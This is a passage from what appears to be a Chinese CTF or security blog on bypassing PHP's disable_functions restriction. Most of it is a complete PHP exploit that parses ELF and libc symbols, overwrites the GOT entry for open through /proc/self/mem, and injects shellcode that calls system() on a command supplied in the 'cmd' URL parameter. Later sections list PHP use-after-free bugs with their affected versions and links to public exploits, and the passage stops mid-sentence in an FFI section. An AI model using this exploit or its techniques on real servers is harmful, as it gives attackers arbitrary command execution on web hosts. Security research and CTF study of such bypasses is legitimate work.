class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_PROGBITS&#x27;</span>,<span class="hljs-number">1</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_SYMTAB&#x27;</span>,<span class="hljs-number">2</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_STRTAB&#x27;</span>,<span class="hljs-number">3</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_RELA&#x27;</span>,<span class="hljs-number">4</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_HASH&#x27;</span>,<span class="hljs-number">5</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_DYNAMIC&#x27;</span>,<span class="hljs-number">6</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NOTE&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NOBITS&#x27;</span>,<span class="hljs-number">8</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_REL&#x27;</span>,<span class="hljs-number">9</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_SHLIB&#x27;</span>,<span class="hljs-number">10</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_DNYSYM&#x27;</span>,<span class="hljs-number">11</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_INIT_ARRAY&#x27;</span>,<span class="hljs-number">14</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_FINI_ARRAY&#x27;</span>,<span class="hljs-number">15</span>);<span class="hljs-comment">//why does section tables have so many fuck type</span><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_HASH&#x27;</span>,<span class="hljs-number">0x6ffffff6</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_versym&#x27;</span>,<span class="hljs-number">0x6fffffff</span>);<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_verneed&#x27;</span>,<span class="hljs-number">0x6ffffffe</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">elf</span></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$elf_bin</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$strtab_section</span>=<span class="hljs-keyword">array</span>();    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rel_plt_section</span>=<span class="hljs-keyword">array</span>();    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-keyword">array</span>();    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getElfBin</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;elf_bin;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setElfBin</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;elf_bin = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$elf_bin</span>,<span class="hljs-string">&quot;rb&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unp</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$value</span>)));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$start</span>,<span class="hljs-variable">$len</span></span>)</span>&#123;        <span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin,<span class="hljs-variable">$start</span>);        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">fread</span> (<span class="hljs-variable">$this</span>-&gt;elf_bin,<span class="hljs-variable">$len</span>);        <span class="hljs-title function_ invoke__">rewind</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin);        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">unp</span>(<span class="hljs-variable">$data</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_section</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>)&#123;            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);        &#125;        <span class="hljs-variable language_">$this</span>-&gt;elf_shoff=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x28</span>,<span class="hljs-number">8</span>);        <span class="hljs-variable language_">$this</span>-&gt;elf_shentsize=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-number">2</span>);        <span class="hljs-variable language_">$this</span>-&gt;elf_shnum=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3c</span>,<span class="hljs-number">2</span>);        <span class="hljs-variable language_">$this</span>-&gt;elf_shstrndx=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3e</span>,<span class="hljs-number">2</span>);        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable language_">$this</span>-&gt;elf_shnum;<span class="hljs-variable">$i</span>+=<span class="hljs-number">1</span>)&#123;            <span class="hljs-variable">$sh_type</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">4</span>,<span class="hljs-number">4</span>);            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$sh_type</span>)&#123;                <span class="hljs-keyword">case</span> SHT_STRTAB:                    <span class="hljs-variable language_">$this</span>-&gt;strtab_section[<span class="hljs-variable">$i</span>]=                        <span class="hljs-keyword">array</span>(                            <span class="hljs-string">&#x27;strtab_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),                            <span class="hljs-string">&#x27;strtab_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>)                        );                    <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">case</span> SHT_RELA:                    <span class="hljs-variable language_">$this</span>-&gt;rel_plt_section[<span class="hljs-variable">$i</span>]=                        <span class="hljs-keyword">array</span>(                            <span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),                            <span class="hljs-string">&#x27;rel_plt_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),                            <span class="hljs-string">&#x27;rel_plt_entsize&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)                        );                    <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">case</span> SHT_DNYSYM:                    <span class="hljs-variable language_">$this</span>-&gt;dynsym_section[<span class="hljs-variable">$i</span>]=                        <span class="hljs-keyword">array</span>(                            <span class="hljs-string">&#x27;dynsym_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),                            <span class="hljs-string">&#x27;dynsym_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),                            <span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)                        );                    <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">case</span> SHT_NULL:                <span class="hljs-keyword">case</span> SHT_PROGBITS:                <span class="hljs-keyword">case</span> SHT_DYNAMIC:                <span class="hljs-keyword">case</span> SHT_SYMTAB:                <span class="hljs-keyword">case</span> SHT_NOBITS:                <span class="hljs-keyword">case</span> SHT_NOTE:                <span class="hljs-keyword">case</span> SHT_FINI_ARRAY:                <span class="hljs-keyword">case</span> SHT_INIT_ARRAY:                <span class="hljs-keyword">case</span> SHT_GNU_versym:                <span class="hljs-keyword">case</span> SHT_GNU_HASH:                     <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">default</span>: <span class="hljs-comment">//                   echo &quot;who knows what $sh_type this is? &quot;;</span>              &#125;           &#125;     &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_reloc</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();        <span class="hljs-variable">$dynsym_section</span>= <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;dynsym_section);        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;strtab_section);        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;rel_plt_section <span class="hljs-keyword">as</span> <span class="hljs-variable">$rel_plt</span> )&#123;             <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>]+<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_size&#x27;</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_entsize&#x27;</span>])             &#123;                <span class="hljs-variable">$rel_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">8</span>);                <span class="hljs-variable">$rel_info</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)&gt;&gt;<span class="hljs-number">32</span>;                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$rel_info</span>*<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>],<span class="hljs-number">4</span>);                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">&#x27;strtab_offset&#x27;</span>]+<span class="hljs-variable">$fun_name_offset</span>-<span class="hljs-number">1</span>;                <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">&#x27;&#x27;</span>;                <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;&quot;</span>)&#123;                    <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));                &#125;                <span class="hljs-variable">$rel_plts</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$rel_offset</span>;            &#125;        &#125;        <span class="hljs-variable language_">$this</span>-&gt;rel_plts=<span class="hljs-variable">$rel_plts</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_shared_library</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>)&#123;            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);        &#125;        <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();        <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;dynsym_section);        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;strtab_section);        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_size&#x27;</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>])        &#123;            <span class="hljs-variable">$shared_library_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>);            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">4</span>);            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$fun_name_offset</span>+<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">&#x27;strtab_offset&#x27;</span>]-<span class="hljs-number">1</span>;            <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">&#x27;&#x27;</span>;            <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;&quot;</span>)&#123;                <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));            &#125;            <span class="hljs-variable">$shared_librarys</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$shared_library_offset</span>;         &#125;         <span class="hljs-variable language_">$this</span>-&gt;shared_librarys=<span class="hljs-variable">$shared_librarys</span>;   &#125;   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;       <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin);   &#125;   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">   </span>&#123;       <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();   &#125;   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">packlli</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;       <span class="hljs-variable">$higher</span> = (<span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0xffffffff00000000</span>) &gt;&gt; <span class="hljs-number">32</span>;       <span class="hljs-variable">$lower</span> = <span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0x00000000ffffffff</span>;       <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;V2&#x27;</span>, <span class="hljs-variable">$lower</span>, <span class="hljs-variable">$higher</span>);   &#125;&#125;<span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">elf</span>();<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-string">&#x27;/proc/self/exe&#x27;</span>);<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();  <span class="hljs-comment">// 获得各函数的got表的地址</span><span class="hljs-variable">$open_php</span>=<span class="hljs-variable">$test</span>-&gt;rel_plts[<span class="hljs-string">&#x27;open&#x27;</span>];<span class="hljs-variable">$maps</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/proc/self/maps&#x27;</span>);<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\w+)-(\w+)\s+.+\[stack]/&#x27;</span>, <span class="hljs-variable">$maps</span>, <span class="hljs-variable">$stack</span>);<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\w+)-(\w+).*?libc-/&#x27;</span>,<span class="hljs-variable">$maps</span>,<span class="hljs-variable">$libcgain</span>);<span class="hljs-variable">$libc_base</span> = <span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$libcgain</span>[<span class="hljs-number">1</span>];<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Libc base: &quot;</span>.<span class="hljs-variable">$libc_base</span>.<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Stack location: &quot;</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-variable">$array_tmp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-variable">$maps</span>);<span class="hljs-variable">$pie_base</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$array_tmp</span>[<span class="hljs-number">0</span>]);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PIE base: &quot;</span>.<span class="hljs-variable">$pie_base</span>.<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-variable">$test2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">elf</span>();<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-string">&#x27;/usr/lib64/libc-2.17.so&#x27;</span>);<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_shared_library</span>();  <span class="hljs-comment">// 解析libc库，得到libc库函数的相对地址</span><span class="hljs-variable">$sys</span> = <span class="hljs-variable">$test2</span>-&gt;shared_librarys[<span class="hljs-string">&#x27;system&#x27;</span>];<span class="hljs-variable">$sys_addr</span> = <span class="hljs-variable">$sys</span> + <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$libc_base</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;system addr:&quot;</span>.<span class="hljs-variable">$sys_addr</span>.<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-variable">$mem</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>);<span class="hljs-variable">$shellcode_loc</span> = <span class="hljs-variable">$pie_base</span> + <span class="hljs-number">0x2333</span>;<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$open_php</span>);<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$shellcode_loc</span>));<span class="hljs-variable">$command</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];  <span class="hljs-comment">// 我们要执行的命令</span><span class="hljs-variable">$stack</span>=<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>]);<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-variable">$stack</span>);<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$command&#125;</span>\x00&quot;</span>);<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$stack</span>;<span class="hljs-variable">$shellcode</span> = <span class="hljs-string">&quot;H\xbf&quot;</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$cmd</span>).<span class="hljs-string">&quot;H\xb8&quot;</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$sys_addr</span>).<span class="hljs-string">&quot;P\xc3&quot;</span>;<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode_loc</span>);<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode</span>);<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;zxhy&#x27;</span>);<span class="hljs-comment">// highlight_file(&#x27;zxhy&#x27;);</span><span class="hljs-comment">// show_source(&#x27;zxhy&#x27;);</span><span class="hljs-comment">// file_get_contents(&#x27;zxhy&#x27;);</span><span class="hljs-keyword">exit</span>();</code></pre></div><h2 id="利用GC-UAF"><a href="#利用GC-UAF" class="headerlink" title="利用GC UAF"></a>利用GC UAF</h2><p>此漏洞利用 PHP 垃圾收集器中一个三年前的<a href="https://bugs.php.net/bug.php?id=72530">bug</a>来绕过 <code>disable_functions</code> 并执行系统命令。</p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><p>exp：<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><h2 id="利用-Json-Serializer-UAF"><a href="#利用-Json-Serializer-UAF" class="headerlink" title="利用 Json Serializer UAF"></a>利用 Json Serializer UAF</h2><p>此漏洞利用json序列化程序中的释放后使用<a href="https://bugs.php.net/bug.php?id=77843">漏洞</a>，利用json序列化程序中的堆溢出触发，以绕过<code>disable_functions</code>和执行系统命令</p><ul><li>Linux 操作系统</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><p>exp: <a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php</a></p><h2 id="利用-Backtrace-UAF"><a href="#利用-Backtrace-UAF" class="headerlink" title="利用 Backtrace UAF"></a>利用 Backtrace UAF</h2><p>该漏洞利用在debug_backtrace()函数中使用了两年的一个 <a href="https://bugs.php.net/bug.php?id=76047">bug</a>。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞</p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><p>exp: <a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><h2 id="利用-concat-operation-UAF"><a href="#利用-concat-operation-UAF" class="headerlink" title="利用 concat operation UAF"></a>利用 concat operation UAF</h2><p>此漏洞利用处理字符串连接的函数中的<a href="https://bugs.php.net/bug.php?id=81705">bug</a>。如果 <code>$a.$b</code> 满足某些条件，则可能导致内存损坏的语句。错误报告提供了对漏洞的非常彻底的分析。</p><ul><li>7.3 - all versions to date</li><li>7.4 - all versions to date</li><li>8.0 - all versions to date</li><li>8.1 - all versions to date</li></ul><p>所有 PHP7 版本中都存在根本问题。但是，较旧的 （&lt;7.3） 版本存在另一个错误，该错误会阻止在代码的某些部分正确释放内存，包括 <code>concat_function</code> 。此漏洞严重依赖该功能才能正常工作，因此在某种程度上，memleak 阻止了内存损坏漏洞的可利用性</p><p>exp: <a href="https://github.com/mm0r1/exploits/blob/master/php-concat-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php-concat-bypass/exploit.php</a></p><h2 id="利用-user-filter"><a href="#利用-user-filter" class="headerlink" title="利用 user_filter"></a>利用 user_filter</h2><p>此漏洞利用了 10 多年前报告的<a href="https://bugs.php.net/bug.php?id=54350">bug</a></p><ul><li>5.* - exploitable with minor changes to the PoC</li><li>7.0 - all versions to date</li><li>7.1 - all versions to date</li><li>7.2 - all versions to date</li><li>7.3 - all versions to date</li><li>7.4 &lt; 7.4.26</li><li>8.0 &lt; 8.0.13</li></ul><p>exp: <a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php</a></p><h2 id="利用SplDoublyLinkedList-UAF"><a href="#利用SplDoublyLinkedList-UAF" class="headerlink" title="利用SplDoublyLinkedList UAF"></a>利用SplDoublyLinkedList UAF</h2><p>PHP的SplDoublyLinkedList双向链表库中存在一个UAF漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等。</p><ul><li>PHP v7.4.10及其之前版本</li><li>PHP v8.0（Alpha）</li></ul><p>例题：BMZCTF2020 - ezphp</p><p>exp: <a href="https://github.com/cfreal/exploits/blob/master/php-SplDoublyLinkedList-offsetUnset/exploit.php">https://github.com/cfreal/exploits/blob/master/php-SplDoublyLinkedList-offsetUnset/exploit.php</a></p><h2 id="利用FFI扩展"><a href="#利用FFI扩展" class="headerlink" title="利用FFI扩展"></a>利用FFI扩展</h2><p>PHP FFI（Foreign Function 